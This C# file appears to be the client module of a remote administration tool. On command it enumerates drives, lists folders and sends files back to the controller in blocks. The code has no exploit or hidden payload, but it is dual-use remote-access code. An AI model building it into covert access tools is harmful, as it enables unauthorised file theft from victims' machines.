using Client.Packets.ClientPackets;
using Client.Packets.ServerPackets;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security;
using System.Threading;

namespace Client.Controllers
{
    class FileManagerController
    {
        private const string DELIMITER = "$E$";
        private static readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
        private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();

        public static void getDrives(GetDrives command, ClientMosaic client)
        {
            DriveInfo[] drives;
            try
            {
                drives = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
            }
            catch (IOException)
            {
                new SetStatusFileManager("GetDrives I/O error", false).Execute(client);
                return;
            }
            catch (UnauthorizedAccessException)
            {
                new SetStatusFileManager("GetDrives No permission", false).Execute(client);
                return;
            }

            if (drives.Length == 0)
            {
                new SetStatusFileManager("GetDrives No drives", false).Execute(client);
                return;
            }

            string[] displayName = new string[drives.Length];
            string[] rootDirectory = new string[drives.Length];
            for (int i = 0; i < drives.Length; i++)
            {
                string volumeLabel = null;
                try
                {
                    volumeLabel = drives[i].VolumeLabel;
                }
                catch
                {
                }

                if (string.IsNullOrEmpty(volumeLabel))
                {
                    displayName[i] = string.Format("{0} [{1}, {2}]", drives[i].RootDirectory.FullName,
                        DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
                }
                else
                {
                    displayName[i] = string.Format("{0} ({1}) [{2}, {3}]", drives[i].RootDirectory.FullName, volumeLabel,
                        DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
                }
                rootDirectory[i] = drives[i].RootDirectory.FullName;
            }

            new GetDrivesResponse(displayName, rootDirectory).Execute(client);
        }

        public static string DriveTypeName(DriveType type)
        {
            switch (type)
            {
                case DriveType.Fixed:
                    return "Local Disk";
                case DriveType.Network:
                    return "Network Drive";
                case DriveType.Removable:
                    return "Removable Drive";
                default:
                    return type.ToString();
            }
        }

        public static void getDirectory(GetDirectory command, ClientMosaic client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) => 
            {
                isError = true;
                message = msg;
            };

            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(command.remotePath);

                FileInfo[] iFiles = dicInfo.GetFiles();
                DirectoryInfo[] iFolders = dicInfo.GetDirectories();

                string[] files = new string[iFiles.Length];
                long[] filessize = new long[iFiles.Length];
                string[] folders = new string[iFolders.Length];

                int i = 0;
                foreach(FileInfo file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    i++;
                }
                if(files.Length == 0)
                {
                    files = new string[] {DELIMITER};
                    filessize = new long[] { 0 };
                }

                i = 0;

                foreach(DirectoryInfo folder in iFolders)
                {
                    folders[i] = folder.Name;
                    i++;
                }
                if(folders.Length == 0)
                {
                    folders = new string[] { DELIMITER };
                }

                new GetDirectoryResponse(files, folders, filessize).Execute(client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("GetDirectory No Permission");
            }
            catch (SecurityException)
            {
                onError("GetDirectory No permission");
            }
            catch (PathTooLongException)
            {
                onError("GetDirectory Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("GetDirectory Directory not found");
            }
            catch (FileNotFoundException)
            {
                onError("GetDirectory File not found");
            }
            catch (IOException)
            {
                onError("GetDirectory I/O error");
            }
            catch (Exception)
            {
                onError("GetDirectory Failed");
            }
            finally
            {
                if(isError && !string.IsNullOrEmpty(message))
                {
                    new SetStatusFileManager(message, true).Execute(client);
                }
            }
        }

        public static void doDownloadFile(DoDownloadFile command, ClientMosaic client)
        {
            new Thread(() =>
            {
                _limitThreads.WaitOne();

                try
                {
                    FileSplit srcFile = new FileSplit(command.remotePath);
                    if (srcFile.MaxBlocks < 0)
                        throw new Exception(srcFile.LastError);

                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                    {
                        if (!client.connected || _canceledDownloads.ContainsKey(command.id))
                            break;

                        byte[] block;

                        if (!srcFile.ReadBlock(currentBlock, out block))
                            throw new Exception(srcFile.LastError);

                        new DoDownloadFileResponse(command.id, Path.GetFileName(command.remotePath), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError).Execute(client);
                    }
                }
                catch (Exception ex)
                {
                    new DoDownloadFileResponse(command.id, Path.GetFileName(command.remotePath), new byte[0], -1, -1, ex.Message).Execute(client);
                }

                _limitThreads.Release();
            }).Start();
        }
    }

    /*
    * Copyright (c) 2019 MaxXor
    */
    public class FileSplit
    {
        private int _maxBlocks;
        private readonly object _fileStreamLock = new object();
        private const int MAX_BLOCK_SIZE = 65535;
        public string Path { get; private set; }
        public string LastError { get; private set; }

        public int MaxBlocks
        {
            get
            {
                if (this._maxBlocks > 0 || this._maxBlocks == -1)
                    return this._maxBlocks;
                try
                {
                    FileInfo fInfo = new FileInfo(this.Path);

                    if (!fInfo.Exists)
                        throw new FileNotFoundException();

                    this._maxBlocks = (int)Math.Ceiling(fInfo.Length / (double)MAX_BLOCK_SIZE);
                }
                catch (UnauthorizedAccessException)
                {
                    this._maxBlocks = -1;
                    this.LastError = "Access denied";
                }
                catch (IOException ex)
                {
                    this._maxBlocks = -1;

                    if (ex is FileNotFoundException)
                        this.LastError = "File not found";
                    if (ex is PathTooLongException)
                        this.LastError = "Path is too long";
                }

                return this._maxBlocks;
            }
        }

        public FileSplit(string path)
        {
            this.Path = path;
        }

        private int GetSize(long length)
        {
            return (length < MAX_BLOCK_SIZE) ? (int)length : MAX_BLOCK_SIZE;
        }

        public bool ReadBlock(int blockNumber, out byte[] readBytes)
        {
            try
            {
                if (blockNumber > this.MaxBlocks)
                    throw new ArgumentOutOfRangeException();

                lock (_fileStreamLock)
                {
                    using (FileStream fStream = File.OpenRead(this.Path))
                    {
                        if (blockNumber == 0)
                        {
                            fStream.Seek(0, SeekOrigin.Begin);
                            var length = fStream.Length - fStream.Position;
                            if (length < 0)
                                throw new IOException("negative length");
                            readBytes = new byte[this.GetSize(length)];
                            fStream.Read(readBytes, 0, readBytes.Length);
                        }
                        else
                        {
                            fStream.Seek(blockNumber * MAX_BLOCK_SIZE, SeekOrigin.Begin);
                            var length = fStream.Length - fStream.Position;
                            if (length < 0)
                                throw new IOException("negative length");
                            readBytes = new byte[this.GetSize(length)];
                            fStream.Read(readBytes, 0, readBytes.Length);
                        }
                    }
                }

                return true;
            }
            catch (ArgumentOutOfRangeException)
            {
                readBytes = new byte[0];
                this.LastError = "BlockNumber bigger than MaxBlocks";
            }
            catch (UnauthorizedAccessException)
            {
                readBytes = new byte[0];
                this.LastError = "Access denied";
            }
            catch (IOException ex)
            {
                readBytes = new byte[0];

                if (ex is FileNotFoundException)
                    this.LastError = "File not found";
                else if (ex is DirectoryNotFoundException)
                    this.LastError = "Directory not found";
                else if (ex is PathTooLongException)
                    this.LastError = "Path is too long";
                else
                    this.LastError = "Unable to read from File Stream";
            }

            return false;
        }

        public bool AppendBlock(byte[] block, int blockNumber)
        {
            try
            {
                if (!File.Exists(this.Path) && blockNumber > 0)
                    throw new FileNotFoundException(); // previous file got deleted somehow, error

                lock (_fileStreamLock)
                {
                    if (blockNumber == 0)
                    {
                        using (FileStream fStream = File.Open(this.Path, FileMode.Create, FileAccess.Write))
                        {
                            fStream.Seek(0, SeekOrigin.Begin);
                            fStream.Write(block, 0, block.Length);
                        }

                        return true;
                    }

                    using (FileStream fStream = File.Open(this.Path, FileMode.Append, FileAccess.Write))
                    {
                        fStream.Seek(blockNumber * MAX_BLOCK_SIZE, SeekOrigin.Begin);
                        fStream.Write(block, 0, block.Length);
                    }
                }

                return true;
            }
            catch (UnauthorizedAccessException)
            {
                this.LastError = "Access denied";
            }
            catch (IOException ex)
            {
                if (ex is FileNotFoundException)
                    this.LastError = "File not found";
                else if (ex is DirectoryNotFoundException)
                    this.LastError = "Directory not found";
                else if (ex is PathTooLongException)
                    this.LastError = "Path is too long";
                else
                    this.LastError = "Unable to write to File Stream";
            }

            return false;
        }
    }
}
